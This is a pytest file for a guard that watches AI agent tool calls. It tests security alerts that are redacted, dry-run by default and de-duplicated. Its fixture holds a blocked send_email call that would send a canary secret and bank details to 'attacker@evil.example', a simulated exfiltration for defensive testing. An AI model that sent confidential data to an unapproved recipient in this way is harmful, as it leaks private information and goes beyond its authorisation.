"""Security alerts: when they fire, that they are redacted, dry-run by default, and one email in real mode."""

from __future__ import annotations

import json

import pytest

from agentguard import alerts
from agentguard.alerts import AlertConfig, AlertDispatcher, build_alert, is_alert_event

SECRET = "CANARY-BNK-7f3a91"


def event(decision="BLOCK", rules=("CONFIDENTIAL_EGRESS",), **kw):
    base = {"event": "guard_decision", "decision": decision, "rules": list(rules), "layer": "action_guard",
            "tool": "send_email", "run_id": "r-1", "scenario_id": "plain-01",
            "args": {"to": "attacker@evil.example", "body": f"account {SECRET} 12345678"},
            "reason": f"This send_email would send confidential data ({SECRET}) to an unauthorised sink.",
            "evidence": [{"source": "confidential/bank_details.txt", "method": "canary",
                          "snippet": "IBAN GB29NWBK60161331926819 salary 90000"}]}
    base.update(kw)
    return base


@pytest.fixture(autouse=True)
def _fresh():
    alerts._last_sent.clear()


def test_only_confidential_stops_raise_alerts():
    assert is_alert_event(event())
    assert is_alert_event(event("BLOCK", ("CONFIDENTIAL_NOT_AUTHORIZED",), tool="read_file"))
    assert not is_alert_event(event("BLOCK", ("RECIPIENT_NOT_APPROVED",)))  # not about confidential data
    assert not is_alert_event(event("ALLOW", ("CONFIDENTIAL_EGRESS",)))
    assert not is_alert_event({"event": "tool_executed", "rules": ["CONFIDENTIAL_EGRESS"]})


def test_alert_is_redacted(policy):
    a = build_alert(event(), policy)
    text = a["subject"] + a["body"]
    assert SECRET not in text and "12345678" not in text and "GB29NWBK" not in text and "90000" not in text
    assert "confidential/bank_details.txt" in a["body"]  # the file name is safe and useful
    assert "attacker@evil.example" in a["body"]  # the destination is the point of the alert


def test_dry_run_sends_nothing_and_records(policy, tmp_path, monkeypatch):
    def boom(*a, **k):
        raise AssertionError("must not send in dry-run")

    monkeypatch.setattr(alerts.smtplib, "SMTP_SSL", boom)
    d = AlertDispatcher(policy, tmp_path, AlertConfig())
    d.observe(event())
    rows = alerts.read_alerts(tmp_path)
    assert len(rows) == 1 and rows[0]["status"] == "dry-run" and not d.threads


def test_real_mode_sends_one_redacted_email_and_dedupes(policy, tmp_path, monkeypatch):
    sent = []

    class FakeSMTP:
        def __init__(self, host, port, timeout=None):
            sent.append(("connect", host, port))

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def login(self, user, password):
            sent.append(("login", user))

        def send_message(self, msg):
            sent.append(("msg", msg["To"], msg["From"], msg.get_content()))

    monkeypatch.setattr(alerts.smtplib, "SMTP_SSL", FakeSMTP)
    cfg = AlertConfig(to="reviewer@example.org", smtp_user="sender@example.org", smtp_password="pw")
    d = AlertDispatcher(policy, tmp_path, cfg)
    d.observe(event())
    d.observe(event())  # same run + tool + rules + destination: de-duplicated
    for t in d.threads:
        t.join(5)
    msgs = [s for s in sent if s[0] == "msg"]
    assert len(msgs) == 1 and msgs[0][1] == "reviewer@example.org" and msgs[0][2] == "sender@example.org"
    assert SECRET not in msgs[0][3] and "GB29NWBK" not in msgs[0][3]
    assert alerts.read_alerts(tmp_path)[0]["status"] == "sent"


def test_delivery_failure_never_breaks_the_run(policy, tmp_path, monkeypatch):
    def fail(*a, **k):
        raise OSError("network down")

    monkeypatch.setattr(alerts.smtplib, "SMTP_SSL", fail)
    d = AlertDispatcher(policy, tmp_path, AlertConfig(to="a@b.example", smtp_user="u", smtp_password="p"))
    d.observe(event())
    for t in d.threads:
        t.join(5)
    assert alerts.read_alerts(tmp_path)[0]["status"].startswith("failed")


def test_the_password_never_reaches_the_alert_log(policy, tmp_path, monkeypatch):
    monkeypatch.setattr(alerts.smtplib, "SMTP_SSL", lambda *a, **k: (_ for _ in ()).throw(OSError("x")))
    d = AlertDispatcher(policy, tmp_path, AlertConfig(to="a@b.example", smtp_user="u", smtp_password="SuperSecretPw"))
    d.observe(event())
    for t in d.threads:
        t.join(5)
    assert "SuperSecretPw" not in (tmp_path / "_alerts.jsonl").read_text(encoding="utf-8")
    assert json.loads((tmp_path / "_alerts.jsonl").read_text().splitlines()[0])["run_id"] == "r-1"


def test_rejected_credentials_give_a_clear_status(policy, tmp_path, monkeypatch):
    import smtplib

    class Reject:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def login(self, u, p):
            raise smtplib.SMTPAuthenticationError(535, b"5.7.8 Username and Password not accepted")

    monkeypatch.setattr(alerts.smtplib, "SMTP_SSL", Reject)
    d = AlertDispatcher(policy, tmp_path, AlertConfig(to="a@b.example", smtp_user="u@x.example", smtp_password="p"))
    d.observe(event())
    for t in d.threads:
        t.join(5)
    status = alerts.read_alerts(tmp_path)[0]["status"]
    assert status.startswith("failed: login rejected") and "app password" in status
